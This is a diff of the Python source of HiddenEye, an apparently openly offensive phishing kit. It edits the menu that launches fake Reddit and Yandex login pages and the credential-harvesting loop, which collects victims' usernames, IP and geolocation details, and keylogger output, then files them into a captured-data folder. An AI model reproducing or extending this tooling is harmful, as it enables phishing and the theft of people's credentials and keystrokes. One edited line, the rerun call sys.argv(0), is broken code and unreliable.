@@ -445,7 +445,7 @@ def mainMenu():
         runPhishing('Yandex', customOption)
     elif option == '35':
         loadModule('Reddit')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
+        customOption = input(("{0}[{1}1{0}]{1} New reddit page\n{0}[{1}2{0}]{1} Old reddit page\n{0}hiddeneye(page_type)> {2}").format(MAIN0, MAIN2, MAIN2))
         runPhishing('Reddit', customOption)
     elif option == '36':
         loadModule('Subitoit')
@@ -460,8 +460,7 @@ def mainMenu():
         endMessage()
 
 def loadModule(module): #This one just show text..
-       print (_(''' {0}
- [{1}*{0}] [mode_select]{0}\n\n''').format(MAIN0, MAIN2))
+       print('{0}[mode_select]{0}'.format(MAIN0))
 
 def inputCustom():
      system('clear')
@@ -539,25 +538,20 @@ def runServer(port):
 
 
 def endMessage():
-        choice = input("\n\n{0}[{1}?{0}] Press 'r' to rerun {1}|{0} return to exit\n{0}{2}".format(MAIN0, MAIN4, MAIN2))
+        choice = input("\n{0}[r:rerun{1}|{0}return:exit]\n{0}{2}".format(MAIN0, MAIN4, MAIN2))
         if choice == 'r':
-           system('sudo python3 hiddeneye.py')
+           system('sudo python3'+sys.argv(0))
         else:
             system('clear')
-            print (_('''[{3}!{0}]hack teh wurld''').format(MAIN2, MAIN2, MAIN4, MAIN0))
+            print ('{0}hack teh wurld'.format(MAIN2))
 def getCredentials(port):
-
-
-    print(_("{0}[{1}*{0}]{1} [keep listenin'] \n{2}\n").format(MAIN0, MAIN2, MAIN4))
+    print(_("{1}[keep listenin']{2}\n").format(MAIN0, MAIN2, MAIN4))
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                writeLog(_(' {0}[dump]{1}\n {0}{2}{1}').format(MAIN2, MAIN3, lines))
+                writeLog('{0}[dump]{1}\n{0}{2}{1}'.format(MAIN2, MAIN3, lines))
                 system('cp Server/www/usernames.txt Server/CapturedData/usernames.txt && rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
-        creds.close()
-
-
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
@@ -576,18 +570,11 @@ def getCredentials(port):
                     writeLog(_(' \n{0}isp: {2} \nCountry: {3}{1}').format(MAIN3, MAIN2, ipinfo['org'], ipinfo['country']))
                     writeLog(_(' \n{0}Region: {2} \nCity: {3}{1}').format(MAIN3, MAIN2, ipinfo['region'], ipinfo['city']))
                 system('cp Server/www/ip.txt Server/CapturedData/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
-                writeLog('..................................................................'.format(MAIN0, MAIN4))
-
-        creds.close()
-
         with open('Server/www/KeyloggerData.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                writeLog('{0}...............................'.format(MAIN0, MAIN4))
                 writeLog(_(' {1}[{0}logging_keys{1}]{1}:\n {0}%s{1}').format(MAIN3, MAIN2) % lines)
                 system('cp Server/www/KeyloggerData.txt Server/CapturedData/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
-        creds.close()
-
 def writeLog(ctx):
     if config.get("Settings", "DidBackground") == "True":
         logFile.write(ctx.replace(MAIN0, "").replace(MAIN1, "").replace(MAIN2, "").replace(MAIN3, "").replace(MAIN4, "") + "\n")
